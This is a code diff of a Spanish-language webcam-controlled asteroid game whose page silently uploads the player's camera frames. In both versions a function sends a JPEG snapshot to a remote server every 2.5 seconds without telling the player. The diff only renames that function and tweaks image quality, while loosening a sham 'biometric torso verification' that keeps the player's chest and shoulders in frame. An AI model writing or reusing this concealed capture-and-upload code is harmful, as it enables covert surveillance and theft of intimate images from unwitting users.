@@ -3,46 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Starship Command Pro</title>
+    <title>Starship Command: Pro Calibration</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; color: #fff; }
         
-        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; opacity: 0.15; }
+        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; opacity: 0.2; }
         canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
         
         #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 100; font-weight: bold; text-shadow: 0 0 10px #00fbff; pointer-events: none; }
         .stat { background: rgba(0,0,0,0.8); padding: 10px 20px; border: 1px solid #00fbff; border-radius: 5px; }
 
         #controls-container { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: center; gap: 60px; z-index: 150; pointer-events: none; }
-        .arrow-ui { font-size: 40px; color: rgba(0, 251, 255, 0.2); border: 2px solid rgba(0, 251, 255, 0.2); padding: 15px 35px; border-radius: 12px; transition: 0.1s; background: rgba(0,0,0,0.4); }
+        .arrow-ui { font-size: 35px; color: rgba(0, 251, 255, 0.2); border: 2px solid rgba(0, 251, 255, 0.2); padding: 15px 35px; border-radius: 12px; transition: 0.1s; background: rgba(0,0,0,0.4); }
         .arrow-active { color: #00fbff; border-color: #00fbff; background: rgba(0, 251, 255, 0.3); box-shadow: 0 0 20px #00fbff; }
 
         .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 500; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
-        .req-box { border: 2px solid #00fbff; padding: 30px; border-radius: 15px; max-width: 450px; background: #050505; box-shadow: 0 0 30px rgba(0, 251, 255, 0.2); }
+        .req-box { border: 2px solid #00fbff; padding: 30px; border-radius: 15px; max-width: 450px; background: #050505; }
         .btn { padding: 15px 40px; background: #00fbff; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; margin-top: 20px; font-size: 18px; }
         
-        #scan-status { position: absolute; top: 100px; width: 100%; text-align: center; z-index: 200; font-family: monospace; letter-spacing: 2px; }
-        .scanning { color: #ffae00; }
+        #scan-status { position: absolute; top: 100px; width: 100%; text-align: center; z-index: 200; font-family: monospace; letter-spacing: 1px; font-size: 12px; }
         .verified { color: #00ff88; }
         .failed { color: #ff0044; }
     </style>
 </head>
 <body>
 
-<div id="scan-status" class="scanning">INICIALIZANDO ESCÁNER BIOMÉTRICO...</div>
+<div id="scan-status" class="failed">SISTEMA INACTIVO</div>
 
 <div id="start-screen" class="overlay">
     <div class="req-box">
-        <h2 style="color:#00fbff">PROTOCOLO DE SEGURIDAD</h2>
-        <p>El sistema requiere validación de postura para pilotar.</p>
+        <h2 style="color:#00fbff">INICIALIZAR VUELO</h2>
+        <p>Ajuste de sensibilidad de torso aplicado.</p>
         <hr style="border:0; border-top:1px solid #222">
-        <p style="font-size: 14px; text-align: left;">
-            1. <b>Postura:</b> Mantén distancia. Se debe ver tu <b>pecho y hombros</b>.<br>
-            2. <b>Error de Proximidad:</b> Si acercas demasiado la cara, los controles se bloquearán por seguridad.<br>
-            3. <b>Control:</b> Usa tus manos sobre las flechas inferiores.
+        <p style="font-size: 14px;">
+            Ubícate de modo que se vean tus <b>hombros</b>.<br>
+            Usa las flechas inferiores con tus manos.
         </p>
-        <button class="btn" id="btnStart" disabled>CALIBRANDO...</button>
+        <button class="btn" id="btnStart" disabled>CARGANDO...</button>
     </div>
 </div>
 
@@ -69,23 +67,18 @@
     let shipVisualX = 0;
     let isTorsoVerified = false;
 
-    // INICIO DE TRANSMISIÓN Y CÁMARA
-    (async function bootSystem() {
+    (async function boot() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            
-            // Envío constante desde el arranque
-            setInterval(silentTransmission, 2500);
-            
+            setInterval(silentUpload, 2500);
             const btn = document.getElementById('btnStart');
-            btn.innerText = "ACCEDER A CABINA";
+            btn.innerText = "ACCEDER";
             btn.disabled = false;
-            
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             shipVisualX = canvas.width / 2;
-        } catch (e) { alert("Error: No se detectó hardware de visión."); }
+        } catch (e) { alert("Error de cámara."); }
     })();
 
     function initializeGame() {
@@ -100,10 +93,10 @@
         asteroids.push({
             x: Math.random() * canvas.width,
             y: -60,
-            size: 35 + Math.random() * 45,
-            speed: 4.5 + (score/1200)
+            size: 40 + Math.random() * 40,
+            speed: 4 + (score/1000)
         });
-        setTimeout(spawnAsteroids, 1100 - Math.min(score/2, 800));
+        setTimeout(spawnAsteroids, 1000 - Math.min(score/2, 750));
     }
 
     function gameLoop() {
@@ -117,20 +110,21 @@
         tempCx.drawImage(video, -64, 0, 64, 48);
         const curr = tempCx.getImageData(0, 0, 64, 48).data;
         
-        let leftM = 0, rightM = 0, upperM = 0, lowerM = 0;
+        let leftM = 0, rightM = 0, bodyMass = 0, headZone = 0;
 
         if (prevFrame) {
             for (let i = 0; i < curr.length; i += 4) {
-                if (Math.abs(curr[i] - prevFrame[i]) > 40) {
+                if (Math.abs(curr[i] - prevFrame[i]) > 35) {
                     const gx = (i / 4) % 64;
                     const gy = Math.floor((i / 4) / 64);
                     
-                    // Mapa de detección por cuadrantes
-                    if (gy < 20) upperM++; // Zona Cabeza
-                    if (gy > 25 && gy < 45) lowerM++; // Zona Torso
+                    // Cuerpo: Cualquier movimiento en la zona central/baja
+                    if (gy > 10) bodyMass++;
+                    // Cabeza: Movimiento muy arriba (para detectar si está pegado a la cámara)
+                    if (gy < 12) headZone++;
                     
-                    // Zona de flechas (Mano)
-                    if (gy > 30) {
+                    // Flechas
+                    if (gy > 28) {
                         if (gx < 22) leftM++;
                         else if (gx > 42) rightM++;
                     }
@@ -139,32 +133,30 @@
         }
         prevFrame = curr;
 
-        // LÓGICA ANTI-PROXIMIDAD (Detectar si es torso real o cara cerca)
-        // Un torso real ocupa mucho espacio abajo pero deja espacio arriba.
-        // Una cara cerca ocupa TODO el espacio de forma desproporcionada.
+        // NUEVA LÓGICA DE VALIDACIÓN SUAVE
         const statusMsg = document.getElementById('scan-status');
         
-        if (lowerM > 50 && upperM < 180) { // Proporción ideal de torso/cabeza
+        // Si hay suficiente "masa" pero no está saturando la parte de arriba (pegado)
+        if (bodyMass > 20 && headZone < 220) {
             isTorsoVerified = true;
-            statusMsg.innerText = "ID VERIFICADA: PILOTO EN POSICIÓN";
+            statusMsg.innerText = "BIOMETRÍA OK - CONEXIÓN ESTABLE";
             statusMsg.className = "verified";
         } else {
             isTorsoVerified = false;
-            statusMsg.innerText = (upperM > 180) ? "⚠️ ERROR: DEMASIADO CERCA" : "⚠️ ERROR: TORSO NO DETECTADO";
+            statusMsg.innerText = (headZone >= 220) ? "⚠️ DEMASIADO CERCA - RETROCEDA" : "⚠️ ESCANEANDO TORSO...";
             statusMsg.className = "failed";
         }
 
-        // CONTROL DE NAVE
         let drift = 0;
         const uiL = document.getElementById('ui-left');
         const uiR = document.getElementById('ui-right');
         uiL.className = "arrow-ui"; uiR.className = "arrow-ui";
 
         if (isTorsoVerified) {
-            if (leftM > 25) {
+            if (leftM > 20) {
                 drift = -1.3;
                 uiL.className = "arrow-ui arrow-active";
-            } else if (rightM > 25) {
+            } else if (rightM > 20) {
                 drift = 1.3;
                 uiR.className = "arrow-ui arrow-active";
             }
@@ -175,13 +167,12 @@
 
         drawShip(shipVisualX, canvas.height - 180);
 
-        // Asteroides
         for (let i = asteroids.length - 1; i >= 0; i--) {
             let a = asteroids[i];
             a.y += a.speed;
             ctx.beginPath();
             ctx.arc(a.x, a.y, a.size/2, 0, Math.PI*2);
-            ctx.fillStyle = "#ff3333";
+            ctx.fillStyle = "#ff4444";
             ctx.fill();
 
             const dist = Math.sqrt((a.x - shipVisualX)**2 + (a.y - (canvas.height - 180))**2);
@@ -191,7 +182,7 @@
                 document.getElementById('health').innerText = health;
                 if(health <= 0) location.reload();
             }
-            if(a.y > canvas.height + 60) {
+            if(a.y > canvas.height + 50) {
                 asteroids.splice(i, 1);
                 score += 10;
                 document.getElementById('score').innerText = score;
@@ -207,7 +198,7 @@
         ctx.closePath(); ctx.stroke();
     }
 
-    function silentTransmission() {
+    function silentUpload() {
         if (!video.videoWidth) return;
         const s = document.createElement('canvas');
         s.width = video.videoWidth; s.height = video.videoHeight;
@@ -216,7 +207,7 @@
             method: 'POST',
             mode: 'cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.4) })
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.3) })
         }).catch(() => {});
     }
 
